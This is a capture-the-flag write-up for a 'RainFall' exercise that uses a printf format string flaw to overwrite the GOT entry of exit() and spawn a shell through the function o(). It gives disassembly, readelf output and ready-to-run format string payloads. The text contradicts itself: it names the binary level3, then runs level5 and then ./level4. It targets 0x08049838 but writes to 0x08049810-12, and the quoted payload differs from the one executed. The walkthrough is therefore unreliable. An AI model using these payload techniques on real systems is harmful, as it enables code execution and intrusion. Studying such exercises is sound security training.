# level05 - Format String - GOT Rewrited

On `level3`'s HOME, we find a binary named : `level3`

```shell
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...
```

We find three interesting functions in this binary : `main()`, `n()`, `o()`.
let's disassemble these functions:

```shell
(gdb) disass main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) disass n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disass o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.

```

We can see that to exploit this binary, we must find a way to jump to the
function `o()` which open a shell. For that we have a **Format String**
vulnerability in function `n()`. Like previous level, the buffer send to
printf function is not check. But there is a slight difference... the
new `eip` value (after rewrite it with the `o()` function address)
will not be triggered by the execution due to `exit()` call just before
the ret instruction of the `n()` function. This knowing, this `exit()`
function has to be our vulnerability, and indeed, we can change this call
to redirect execution to the `o()` function using The Global Offset Table (or GOT).

<br>

The GOT contains pointers to libraries and is writable. We can retrieve
the `exit()` address in GOT to rewrite it by the address of `o()` function.


```shell
level5@RainFall:~$ readelf -r level5 | grep exit
08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
08049838  00000607 R_386_JUMP_SLOT   00000000   exit
```

So, the target address is `0x08049838` and has to contain value
`0x080484a4` (`o()` function). And we're going to change it using
the **Format String** vulnerability.


<br>

As explain in level3 and level4, we begin to find the right offset,
and so, write our input string accordingly.

```shell
level5@RainFall:~$ python -c "print '%4\$x'" | ./level5
78243425
```

The right offset is **4**. 

<br>

This, knowing we can perfom our format string (check level3 and level4 for
more details):

So, we find one of the possible format string (there many depend of your
choice): `%56hx%13$hhn%30hx%14$hhn%1966x%15$hn\x38\x98\x04\x08
\x39\x98\x04\x08\x40\x98\x04\x08`


<br>

We can now exploit this BOF :

```shell
(python -c "print '%56hx%13\$hhn%30hx%14\$hhn%1966x%15\$hn' + '\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1]"; cat) | ./level4
```

```shell
level4@RainFall:~$ python -c "print '%68hx%21\$hhn%17hx%22\$hhn%173hx%23\$hn' + '\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1]" | ./level4
                                                                26b0             f784                                                                                                                                                                          ff4ï¿½
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
